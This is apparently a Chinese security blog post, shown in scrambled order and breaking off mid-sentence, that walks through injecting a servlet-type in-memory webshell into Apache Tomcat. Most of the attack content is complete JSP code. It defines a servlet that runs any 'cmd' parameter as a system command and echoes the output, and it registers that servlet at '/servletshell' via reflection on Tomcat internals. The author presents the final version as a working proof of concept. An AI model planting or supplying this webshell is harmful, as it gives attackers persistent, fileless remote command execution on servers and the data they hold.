servicef.setAccessible(true);</span><br><span class=\"line\">    StandardService service=(StandardService) servicef.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取mapper</span><br><span class=\"line\">    Mapper mapper=service.getMapper();</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取contextVersion</span><br><span class=\"line\">    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(&quot;contextObjectToContextVersionMap&quot;);</span><br><span class=\"line\">    contextObjectToContextVersionMapf.setAccessible(true);</span><br><span class=\"line\">    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);</span><br><span class=\"line\">    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //调用addWrapper方法</span><br><span class=\"line\">    Class[] classes=mapper.getClass().getDeclaredClasses();</span><br><span class=\"line\">    Class classt=classes[1];</span><br><span class=\"line\">    Method addWrapper=mapper.getClass().getDeclaredMethod(&quot;addWrapper&quot;, classt, String.class, Wrapper.class, boolean.class, boolean.class);</span><br><span class=\"line\">    addWrapper.setAccessible(true);</span><br><span class=\"line\">    addWrapper.invoke(mapper,contextVersion,&quot;/servletshell&quot;,shellWrapper,false,false);</span><br><span class=\"line\">    System.out.println(&quot;ook&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    if(state!=null)&#123;</span><br><span class=\"line\">        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>成功注入</p>\n<p>后面测试了一下，前面的 addservlet方法这些不需要执行就能成功，所以最终poc</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.Writer&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardWrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardService&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.mapper.Mapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.concurrent.ConcurrentHashMap&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Servletshell extends HttpServlet &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            String cmd=req.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot;+cmd).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Writer writer=resp.getWriter();</span><br><span class=\"line\">                writer.write(new String(baos.toByteArray()));</span><br><span class=\"line\">                writer.flush();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            super.doPost(req, resp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //获取context</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">      //创建自定义wrapper</span><br><span class=\"line\">    Servletshell shell=new Servletshell()</span><br><span class=\"line\">    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();</span><br><span class=\"line\">    shellWrapper.setServlet(shell);</span><br><span class=\"line\">    shellWrapper.setServletClass(shell.getClass().getName());</span><br><span class=\"line\">    shellWrapper.setParent(standardContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取service属性</span><br><span class=\"line\">    Field servicef=applicationContext.getClass().getDeclaredField(&quot;service&quot;);</span><br><span class=\"line\">    servicef.setAccessible(true);</span><br><span class=\"line\">    StandardService service=(StandardService) servicef.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取mapper</span><br><span class=\"line\">    Mapper mapper=service.getMapper();</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取contextVersion</span><br><span class=\"line\">    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(&quot;contextObjectToContextVersionMap&quot;);</span><br><span class=\"line\">    contextObjectToContextVersionMapf.setAccessible(true);</span><br><span class=\"line\">    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);</span><br><span class=\"line\">    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //调用addWrapper方法</span><br><span class=\"line\">    Class[] classes=mapper.getClass().getDeclaredClasses();</span><br><span class=\"line\">    Class classt=classes[1];</span><br><span class=\"line\">    Method addWrapper=mapper.getClass().getDeclaredMethod(&quot;addWrapper&quot;, classt, String.class, Wrapper.class, boolean.class, boolean.class);</span><br><span class=\"line\">    addWrapper.setAccessible(true);</span><br><span class=\"line\">    addWrapper.invoke(mapper,contextVersion,&quot;/servletshell&quot;,shellWrapper,false,false);</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n<p>简短了很多</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>在实现servlet内存马的过程中，没有像以前一样，完全照着资料做，大部分都是自己来调试，花的时间确实要多了一些，不过感觉这样的影响更深刻，还可以有一些自己的理解，感觉很好。不过因为许多是自己的理解，所以肯定会有错误的地方，希望各位师傅不吝赐教。</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>开学鸽了一段时间，现在重新把内存马拿起来</p>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>servlet型的原理跟前面两种一样，也是想办法动态注册一个servlet。这里先编写一个servlet</p>\n<p>打好断点，开始调试，看看在哪进行的实例化</p>\n<p>调试发现，实例化是在<code>DefaultInstanceManager#newInstance</code> 中进行的，继续向前追踪 <code>clazz</code> 的来源</p>\n<p>这里也就知道了上文中的 <code>clazz</code> 其实就是 <code>StandardWrapper.servletClass</code> ，再继续追踪来源的时候，我看到<code>StandardWrapperValve</code> 中的 <code>context</code> ，也就是 <code>StandardContext</code> 有一个 <code>children</code> 属性</p>\n<p>直接眼前一亮，这里面存储了路由与wrapper的对应关系，那如果我们能将恶意的servlet添加进去是不是就可以实现动态注册servlet了，那么怎么才能将其添加进去呢。看到 <code>StandardContext</code> 有一个 <code>addServlet</code> 方法</p>\n<p>不过并没有具体实现，但是我们在其子类<code>ApplicationContext</code> 中找到了实现流程</p>\n<p>先判断状态，然后调用 <code>createWrapper</code> 方法去封装 <code>servlet</code> ，接着调用 <code>addChild</code> 方法将其添加到 <code>children</code> 中，那么我们是否能通过调用该方法实现servlet的动态注册呢，先试一下，简单写个demo</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.io.Writer&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=<span class=\"string\">&quot;text/html;charset=UTF-8&quot;</span> language=<span class=\"string\">&quot;java&quot;</span> %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Servletshell</span> <span class=\"keyword\">extends</span> <span class=\"title\">HttpServlet</span> </span>&#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_ invoke__\">doGet</span>(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            String cmd=req.<span class=\"title function_ invoke__\">getParameter</span>(<span class=\"string\">&quot;cmd&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(cmd!=<span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.<span class=\"title function_ invoke__\">getRuntime</span>().<span class=\"title function_ invoke__\">exec</span>(<span class=\"string\">&quot;cmd /c &quot;</span>+cmd).<span class=\"title function_ invoke__\">getInputStream</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = <span class=\"keyword\">new</span> <span class=\"title class_\">ByteArrayOutputStream</span>();</span><br><span class=\"line\">                byte[] b = <span class=\"keyword\">new</span> byte[<span class=\"number\">1024</span>];</span><br><span class=\"line\">                <span class=\"keyword\">int</span> a = -<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">while</span> ((a = in.<span class=\"title function_ invoke__\">read</span>(b)) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                    baos.<span class=\"title function_ invoke__\">write</span>(b, <span class=\"number\">0</span>, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Writer writer=resp.<span class=\"title function_ invoke__\">getWriter</span>();</span><br><span class=\"line\">                writer.<span class=\"title function_ invoke__\">write</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>(baos.<span class=\"title function_ invoke__\">toByteArray</span>()));</span><br><span class=\"line\">                writer.<span class=\"title function_ invoke__\">flush</span>();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_ invoke__\">doPost</span>(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            super.<span class=\"title function_ invoke__\">doPost</span>(req, resp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    <span class=\"comment\">//获取context</span></span><br><span class=\"line\">    ServletContext servletContext = request.<span class=\"title function_ invoke__\">getSession</span>().<span class=\"title function_ invoke__\">getServletContext</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.<span class=\"title function_ invoke__\">getClass</span>().<span class=\"title function_ invoke__\">getDeclaredField</span>(<span class=\"string\">&quot;context&quot;</span>);</span><br><span class=\"line\">    appctx.<span class=\"title function_ invoke__\">setAccessible</span>(<span class=\"literal\">true</span>);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.<span class=\"title function_ invoke__\">get</span>(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.<span class=\"title function_ invoke__\">getClass</span>().<span class=\"title function_ invoke__\">getDeclaredField</span>(<span class=\"string\">&quot;context&quot;</span>);</span><br><span class=\"line\">    stdctx.<span class=\"title function_ invoke__\">setAccessible</span>(<span class=\"literal\">true</span>);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.<span class=\"title function_ invoke__\">get</span>(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//修改状态</span></span><br><span class=\"line\">    Field state=Class.<span class=\"title function_ invoke__\">forName</span>(<span class=\"string\">&quot;org.apache.catalina.util.LifecycleBase&quot;</span>).<span class=\"title function_ invoke__\">getDeclaredField</span>(<span class=\"string\">&quot;state&quot;</span>);</span><br><span class=\"line\">    state.<span class=\"title function_ invoke__\">setAccessible</span>(<span class=\"literal\">true</span>);</span><br><span class=\"line\">    state.<span class=\"title function_ invoke__\">set</span>(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//尝试注入</span></span><br><span class=\"line\">    String servletName=<span class=\"string\">&quot;servletShell&quot;</span>;</span><br><span class=\"line\">    String servletClass=<span class=\"string\">&quot;servletShell.class&quot;</span>;</span><br><span class=\"line\">    Class serletC=Servletshell.<span class=\"keyword\">class</span>;</span><br><span class=\"line\">    Method addServlet=Class.<span class=\"title function_ invoke__\">forName</span>(<span class=\"string\">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).<span class=\"title function_ invoke__\">getDeclaredMethod</span>(<span class=\"string\">&quot;addServlet&quot;</span>, String.<span class=\"keyword\">class</span>, Class.<span class=\"keyword\">class</span>);</span><br><span class=\"line\">    <span class=\"comment\">//addServlet.setAccessible(true);</span></span><br><span class=\"line\">    addServlet.<span class=\"title function_ invoke__\">invoke</span>(applicationContext,servletName,serletC);</span><br><span class=\"line\">    System.out.<span class=\"title function_ invoke__\">println</span>(standardContext.<span class=\"title function_ invoke__\">findChildren</span>());</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>可以看到我们自定义的servlet已经插入到 <code>children</code> 里了，不过还有一个问题，这没有匹配的路由啊</p>\n<p>所以我们还得想办法将路由对应到 <code>servlet-name</code></p>\n<p>可以看到有 <code>addServletMapping</code> 方法，试试看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.Writer&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Servletshell extends HttpServlet &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            String cmd=req.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot;+cmd).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Writer writer=resp.getWriter();</span><br><span class=\"line\">                writer.write(new String(baos.toByteArray()));</span><br><span class=\"line\">                writer.flush();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            super.doPost(req, resp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //获取context</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //修改状态</span><br><span class=\"line\">    Field state=Class.forName(&quot;org.apache.catalina.util.LifecycleBase&quot;).getDeclaredField(&quot;state&quot;);</span><br><span class=\"line\">    state.setAccessible(true);</span><br><span class=\"line\">    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class=\"line\"></span><br><span class=\"line\">    //尝试注入</span><br><span class=\"line\">    String servletName=&quot;servletShell&quot;;</span><br><span class=\"line\">    String urlpattern=&quot;/servletshell&quot;;</span><br><span class=\"line\">    Class serletC=Servletshell.class;</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServlet=Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;).getDeclaredMethod(&quot;addServlet&quot;, String.class, Class.class);</span><br><span class=\"line\">    addServlet.invoke(applicationContext,servletName,serletC);</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServletMapping=Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredMethod(&quot;addServletMapping&quot;, String.class, String.class);</span><br><span class=\"line\">    addServletMapping.invoke(standardContext,urlpattern,servletName);</span><br><span class=\"line\"></span><br><span class=\"line\">    System.out.println(standardContext.findChildren());</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>可以看到已经添加进去了，但是访问该路由却是503，并且正常页面也变成503了，猜测是破坏了内存中的结构之类的</p>\n<p>不好意思，是我sb了，没把状态修改回来。只需要在后面添加如下代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(state!=null)&#123;</span><br><span class=\"line\">        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>不过，访问变成了404</p>\n<p>现在来分析一下为啥没有正常访问到，在 <code>ApplicationFilterChain#</code>`internalDoFilter <code>中调用</code> servlet <code>的</code> service` 方法处打个断点</p>\n<p>可以看到这里获取到的是 <code>DefaultServlet</code> ，而不是我们注入的 <code>ServletShell</code> ，我们现在就来追踪一下这个servlet的来源，该servlet是通过 <code>setServlet</code> 方法进行赋值的，在该方法处打个断点</p>\n<p>在<code>ApplicationFilterFactor#createFilterChain</code>方法中调用该方法进行赋值</p>\n<p>继续往前追踪，在<code>StandardWrapperValv#invoke</code>可以看到</p>\n<p>servlet是 <code>wrapper.allocate</code> 的返回值，跟进一下这个方法</p>\n<p>简单看一下可知，这里是返回了 <code>instance</code> 属性的值，那么此时我们要继续追寻 <code>instance</code> 属性的来源，直接看一下 <code>wrapper</code> 是咋来的</p>\n<p>跟进 <code>getContainer</code></p>\n<p>对应的赋值方法为 <code>setContainer</code> ，在那打个断点，然后没断下来，说明没有调用到该方法，然后看到上层的<code>StandardContextValve#invoke</code></p>\n<p>可以看到wrapper已经被赋值了，该 <code>wrapper</code>是从 